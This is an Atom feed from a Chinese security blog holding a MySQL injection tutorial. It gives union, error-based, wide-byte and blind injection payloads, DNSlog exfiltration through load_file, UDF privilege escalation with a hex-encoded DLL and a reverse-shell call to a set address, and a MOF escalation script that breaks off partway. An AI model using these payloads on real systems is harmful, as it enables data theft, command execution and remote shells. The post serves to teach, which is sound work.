<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KB-AT的博客</title>
  
  <subtitle>KB-AT</subtitle>
  <link href="https://kb-at-zero.github.io/atom.xml" rel="self"/>
  
  <link href="https://kb-at-zero.github.io/"/>
  <updated>2021-04-20T12:49:37.520Z</updated>
  <id>https://kb-at-zero.github.io/</id>
  
  <author>
    <name>AT</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Web安全-Mysql注入</title>
    <link href="https://kb-at-zero.github.io/2021/04/20/Web%E5%AE%89%E5%85%A8-Mysql%E6%B3%A8%E5%85%A5/"/>
    <id>https://kb-at-zero.github.io/2021/04/20/Web%E5%AE%89%E5%85%A8-Mysql%E6%B3%A8%E5%85%A5/</id>
    <published>2021-04-20T04:42:34.000Z</published>
    <updated>2021-04-20T12:49:37.520Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h1><h2 id="Sql-注入介绍"><a href="#Sql-注入介绍" class="headerlink" title="Sql 注入介绍"></a>Sql 注入介绍</h2><p>sql注入就是指Web应用程序在对用户输入的数据未进行合法性的判断，并且前端传入后端的参数是攻击者可控的，并且参数可以带入数据库进行执行。攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p><h2 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h2><p>MySQL 是一款安全、跨平台、高效的，并与 PHP、Java 等主流编程语言紧密结合的数据库系统。该数据库系统是由瑞典的 MySQL AB 公司开发、发布并支持，由 MySQL 的初始开发人员 David Axmark 和 Michael Monty Widenius 于 1995 年建立的。目前 MySQL 被广泛地应用在 Internet 上的中小型网站中。由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，使得很多公司都采用 MySQL 数据库以降低成本。MySQL 数据库可以称得上是目前运行速度最快的 SQL 语言数据库之一。除了具有许多其他数据库所不具备的功能外，MySQL 数据库还是一种完全免费的产品，用户可以直接通过网络下载 MySQL 数据库，而不必支付任何费用。</p><h2 id="MySQL-基础知识"><a href="#MySQL-基础知识" class="headerlink" title="MySQL 基础知识"></a>MySQL 基础知识</h2><ul><li>字符串截取函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left(str,index)  &#x2F;&#x2F;从左边第index开始截取</span><br><span class="line">right(str,index) &#x2F;&#x2F;从右边第index开始截取</span><br><span class="line">substring(str,index) &#x2F;&#x2F;从左边index开始截取</span><br><span class="line">substr(str,index,len) &#x2F;&#x2F;截取str,index开始,截取len的长度</span><br><span class="line">mid(str,index,ken) &#x2F;&#x2F;截取str 从index开始,截取len的长度</span><br></pre></td></tr></table></figure><ul><li>字符串比较</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) &#x2F;&#x2F;如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br><span class="line">find_in_set(str,strlist) &#x2F;&#x2F;如果相同则返回1不同则返回0</span><br></pre></td></tr></table></figure><ul><li>字符串连接函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2) &#x2F;&#x2F;将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2) &#x2F;&#x2F;将字符串用指定连接符连接</span><br><span class="line">group_concat()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><ul><li>一些绕过注入的罕见函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) &#x2F;&#x2F;从子字符串中返回子串第一次出现的位置</span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) &#x2F;&#x2F; 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure><ul><li><p>运算符</p><ul><li>算术运算符: <code> + - * /   </code></li><li>比较运算符: <code>= &lt;&gt; != &gt; &lt;   </code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)between &#x2F;&#x2F;select database() between 0x61 and 0x7a; &#x2F;&#x2F;select database() between &#39;a&#39; and &#39;z&#39;;</span><br><span class="line">(2)in &#x2F;&#x2F;select &#39;123&#39; in (&#39;12&#39;) &#x3D;&gt; 0</span><br><span class="line">(3)like(模糊匹配) &#x2F;&#x2F;select &#39;12345&#39; like &#39;12%&#39; &#x3D;&gt; true</span><br><span class="line">(4)regexp 或 rlike(正则匹配)&#x2F;&#x2F;select &#39;123455&#39; regexp &#39;^12&#39; &#x3D;&gt; true</span><br></pre></td></tr></table></figure></li><li>逻辑运算符: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 &#x3D;&#x3D; &amp;&amp;</span><br><span class="line">OR 逻辑或 &#x3D;&#x3D; ||</span><br><span class="line">XOR 逻辑异或 &#x3D;&#x3D; ^</span><br></pre></td></tr></table></figure></li><li>位运算符:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure></li><li>注释符:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;&#x2F;单行注释符,url记得编码为%23</span><br><span class="line">&#x2F;**&#x2F; </span><br><span class="line">--+</span><br></pre></td></tr></table></figure></li></ul></li><li><p>常用函数</p><ul><li>延时函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br></pre></td></tr></table></figure></li><li>编码函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex() ascii()</span><br></pre></td></tr></table></figure></li><li>文件函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.load_file  &#x2F;&#x2F;读取文件</span><br><span class="line">2.outfile &#x2F;&#x2F;写入文件</span><br></pre></td></tr></table></figure></li></ul></li><li><p>一些构造语句的知识</p><ul><li>条件语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3) &#x2F;&#x2F; expr1 true执行expr2否则执行expr3</span><br><span class="line">select case when (条件) then 代码1 else 代码 2 end</span><br></pre></td></tr></table></figure></li><li>information_schema 结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables:</span><br><span class="line">查询表名:table_name  对应的数据库名: table_schema</span><br><span class="line">information_schema.columns:</span><br><span class="line">查询列名:column_name 对应的表名:table_schemamysql盲注语句一般形式</span><br><span class="line">查询结果 + 比较运算符 + 猜测值</span><br></pre></td></tr></table></figure></li><li>mysql 报错注入：构造报错语句 + 查询结果</li><li> mysql 联合注入：构造联合语句 + 查询结果</li><li>mysql 盲注：查询结果 + 比较运算符 + 猜测值</li><li>mysql空白字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释</span><br><span class="line"> # 这个也可以用来做分隔 挺有意思</span><br></pre></td></tr></table></figure></li><li>tips:</li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">函数名和括号直接可以插入特殊字符 ex</span><br><span class="line"></span><br><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br><span class="line"></span><br><span class="line">&#123;identifier expr&#125;</span><br><span class="line">select &#123;x 1&#125; from &#123;x test&#125; limit 1;</span><br></pre></td></tr></table></figure></li></ul><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>union是用于合并两个sql查询结果的语句，要使用union必须有相同的列数 、必须有两条以上的select语句组成、列的数据类型必须兼容，兼容的含义是必须数据库可以隐含转换他们的类型。</p><ul><li><p>联合查询注入的主要步骤为：</p><ul><li><p>1.判断是否存在可疑的注入点(数字型或字符型)。<br>  *数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符型一般需要使用单引号来闭合。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法一: 单引号法: &#39;</span><br><span class="line">方法二: 逻辑法</span><br><span class="line">and 1&#x3D;1</span><br><span class="line">and 1&#x3D;2</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br><span class="line">方法三:运算法</span><br><span class="line">-1</span><br><span class="line">-0</span><br></pre></td></tr></table></figure></li><li><p>2.猜解表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见敏感表名</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">user admin_userinfo</span><br><span class="line">system</span><br><span class="line">vipuser</span><br><span class="line">a_admin</span><br><span class="line">xxx_admin </span><br></pre></td></tr></table></figure></li><li><p>3.猜字段数：order by </p></li><li><p>4.猜解字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感字段名:</span><br><span class="line"></span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">admin_usernmae</span><br><span class="line">admin_password </span><br></pre></td></tr></table></figure></li><li><p>5.获取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1 union select 1,2,3，&#39;&#39;&#39;&#39;&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>注</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">当mysql 版本小于4.0 的时候 ，是不支持 union seletc联合查询的 </span><br><span class="line">当mysql 版本大于5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</span><br><span class="line">列举几个常见的查询函数</span><br><span class="line"></span><br><span class="line">1.version()- 数据库版本</span><br><span class="line">2.user() -数据库用户</span><br><span class="line">3. database() - 当前所在数据库</span><br><span class="line">4. current_user() - 当前用户名</span><br><span class="line">5. system_user() - 系统用户名</span><br><span class="line">6. session_user() -连接到数据库的用户名</span><br><span class="line">7. @@basedir - 数据库的安装目录</span><br><span class="line">8. @@datadir - 数据库文件存放目录</span><br><span class="line">9. SCHEMATA-  记录当前数据库服务器所有数据库名称</span><br><span class="line">10.TABALES-   记录了当前数据库服务器所有表的信息</span><br></pre></td></tr></table></figure><h2 id="MYSQL报错注入"><a href="#MYSQL报错注入" class="headerlink" title="MYSQL报错注入"></a>MYSQL报错注入</h2><p>常见payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() &#x2F;&#x2F;5.1.5</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() &#x2F;&#x2F;5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() &#x2F;&#x2F;5.5.5版本之后可以使用</span><br><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const &#x2F;&#x2F;支持老版本</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入,例如说PHP的编码为 UTF-8而MySql的编码设置为了SET NAMES ‘gbk’ 或是 SET character_set_client =gbk，这样配置会引发编码转换从而导致的注入漏洞。<br>这里要说明一小点的是：<br>SET NAMES ‘x’语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;x;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;x;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;x;</span><br></pre></td></tr></table></figure><p>也就是说你设置了 SET NAMES ‘x’ 时就等于同时执行了上面的3条语句</p><p>实际上宽字节注入就是PHP发送请求到MySql时使用了语句SET NAMES ‘gbk’ 或是SET character_set_client =gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><ul><li>宽字节注入原理<ul><li>原理可参考：<a href="https://xz.aliyun.com/t/1719">https://xz.aliyun.com/t/1719</a></li><li>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure></li><li>MYSQL client链接编码：假如这个网站有宽字节注入那么我们提交：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27</span><br></pre></td></tr></table></figure>这时,假如我们现在使用的是addslashes来过滤,那么就会发生如下的转换过程:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39;</span><br></pre></td></tr></table></figure>前端输入%df%27时首先经过上面addslashes函数转义变成了%df%5c%27（%5c是反斜杠)，之后在数据库查询前因为设置了GBK编码，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。然后MySQL服务器就会对查询语句进行GBK编码即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。</li><li>MYSQL iconv函数 mb_convert_encoding函数：<br>借用先知: $id =iconv(‘GBK’,’UTF-8’, $id)<br>%df%27===(addslashes)===&gt;%df%5c%27===(iconv)===&gt;%e5%5c%5c%27<br>其实就是 utf8 -&gt; gbk -&gt;utf-8 低位的%5c 也就是反斜杠干掉了转义单引号的反斜杠。</li><li>Big5编码导致的宽字节注入：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测代码: iconv(&#39;utf-8&#39;,&#39;BIG5&#39;,$_GET[&#39;id&#39;])</span><br><span class="line">payload构造同上: 功&#39; -&gt; addsalshes -&gt; 功\&#39; -&gt; iconv -&gt; %A5%5C%5C%27-&gt;¥\&#39; 逃逸单引号%E8%B1%B9&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>left()函数</td><td>left(database(),1)&gt;’s’ database()显示数据库名称，left(a,b)从左侧截取a的前b位</td></tr><tr><td>regexp</td><td>select user() regex ‘^r’ 正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</td></tr><tr><td>like</td><td>select user() like ‘ro%’ 与regexp相似，使用like进行匹配</td></tr><tr><td>substr()函数 ascii()函数</td><td>ascii(substr((select database()),1,1))=98 substr(a,b,c)从b位置开始，截取字符串a的长度，ascii()将某个字符转换为ascii值</td></tr><tr><td>ord()函数 mid()函数</td><td>ord(mid((select user()),1,1))=114 mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转换为ascii值</td></tr></tbody></table><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>代码存在sql注入漏洞，但页面即不会回显数据，也不会回显错误信息，语句执行也不提示真假，不能通过页面的内容来进行判断，这里可通过构造语句，通过页面响应的时长，来判断信息，即时间盲注。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(left(user(),1)&#x3D;&#39;a&#39;,0,sleep(3))    #(user(),1)&#x3D;&#39;a&#39;处替换sql语句</span><br><span class="line">if(sascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  #(database(),1,1)和115处为替换sql语句</span><br></pre></td></tr></table></figure><h2 id="DNSlog-SQL盲注"><a href="#DNSlog-SQL盲注" class="headerlink" title="DNSlog SQL盲注"></a>DNSlog SQL盲注</h2><p>在mysql中load_file 会带dns查询请求<br>具体可以参考 mysql带外攻击 out of band 安全客有这篇文章<br>首先查看变量确定权限<br>show variables like ‘%secure%’</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p><p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>3、当secure_file_priv为null，load_file就不能加载文件。</p><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置<br>unc路径 网络共享文件方式 \xq17.com\tet这样的路径<br>用4个\是因为转义 本质是:<br>最好进行加密处理 防止特殊字符导致失败 如下<br>select load_file(concat(0x5c5c5c5c,version(),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));<br>坑点:之前一直用bugscan的dnslog 用<br>select load_file(‘\\‘,version(),’.dnslog地址’) 发现一直收不到信息<br>注意一般分配给我们的是二级域名所以我们要有个点 把返回信息放在三级域名那里 后来用16进制加密之后就发现可以了 可能是传输的时候出现了@之类什么奇怪的字符 导致了传输失败<br>总结:</p><p>1.对数据能加密尽量加密</p><p>2.dns解析 能很好解决盲打盲注的不可知的缺陷</p><p>3.缺点是:限制比较多</p><p>参考：<a href="https://www.t00ls.net/thread-44273-1-1.html">https://www.t00ls.net/thread-44273-1-1.html</a></p><p>工具：<a href="https://xz.aliyun.com/t/2359%E3%80%81https://github.com/ADOOO/DnslogSqlinj">https://xz.aliyun.com/t/2359、https://github.com/ADOOO/DnslogSqlinj</a></p><p>sqlmap：<a href="https://www.cnblogs.com/backlion/p/8984121.html">https://www.cnblogs.com/backlion/p/8984121.html</a></p><p>其他利用：<a href="https://www.freebuf.com/column/184587.html">https://www.freebuf.com/column/184587.html</a></p><h2 id="MYSQL-命令执行"><a href="#MYSQL-命令执行" class="headerlink" title="MYSQL 命令执行"></a>MYSQL 命令执行</h2><ul><li><p>UDF提权</p><p>  UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。</p><p>  Secure_file_priv：secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。通过执行SHOW VARIABLES LIKE “secure_file_priv”;查看secure-file-priv的状态。</p><p>  1、当secure_file_priv的值为null ，表示限制mysql不允许导入导出。</p><p>  2、当secure_file_priv的值为/tmp/ ，表示限制mysql的导入导出只能发生在/tmp/目录下。</p><p>  3、当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。</p><ul><li>UDF提权条件：<ul><li>mysql &lt; 5.0，导出路径随意。</li><li>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)。</li><li>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</li><li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul></li><li>实战步骤：<ul><li>查看  secure_file_priv  的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br></pre></td></tr></table></figure></li><li>查看系统架构以及plugin目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;             #查看主机版本及架构</span><br><span class="line">show variables like &#39;plugin%&#39;;               #查看 plugin 目录</span><br></pre></td></tr></table></figure></li><li>Sqlmap目录下找到对应的dll文件：Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。（脚本位置/usr/share/sqlmap/extra/cloak/） 执行python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_进行dll_文件的解码，获得dll文件。</li><li>通过查询语句将dll上传到目标服务器上。路径具体参考udf提权条件（这里演示5.0 &lt;= mysql &lt; 5.1）。执行语句select 0xcode into dumpfile ‘C:\Windows\System32\cooltige.dll’。（写入方法也有select unhex(十六进制)、select char(77,90,144…)）。</li><li>将udf.dll 文件写入数据库：<ul><li>1、远程加载：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load_file() 函数支持远程加载，配合 dumpfile 实现写入lib 目录下一定要有 plugin 文件夹否则报错</span><br><span class="line">select load_file(&#39;C:\Python27\sqlmap\data\udf\mysql\windows\64&#39;) into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></li><li>2、本地写入：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);</span><br><span class="line">insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);</span><br><span class="line">update temp set data &#x3D; concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);</span><br><span class="line">select data from temp into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></li></ul></li><li>通过dll文件创建函数。CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’。</li><li>创建成功后就可以直接执行命令：select sys_eval(‘whoami’);</li><li>删除创建的函数DROP FUNCTION sys_eval;</li></ul></li></ul></li><li><p>反弹端口提权<br>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell        # 执行cmd</span><br><span class="line">downloader      # 下载者,到网上下载指定文件并保存到指定目录</span><br><span class="line">open3389        # 通用开3389终端服务,可指定端口(不改端口无需重启)</span><br><span class="line">backshell       # 反弹Shell</span><br><span class="line">ProcessView     # 枚举系统进程</span><br><span class="line">KillProcess     # 终止指定进程</span><br><span class="line">regread         # 读注册表</span><br><span class="line">regwrite        # 写注册表</span><br><span class="line">shut            # 关机,注销,重启</span><br><span class="line">about           # 说明与帮助函数</span><br></pre></td></tr></table></figure></li></ul><p>反弹端口提权udf链接：<a href="https://github.com/Geekby/langouster_udf">https://github.com/Geekby/langouster_udf</a><br>导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</span><br><span class="line">select backshell(&quot;10.20.24.244&quot;, 2333);</span><br></pre></td></tr></table></figure><ul><li><p>MOF 提权<br>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><ul><li>上传 mof 文件执行命令,mof 脚本的内容如下：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    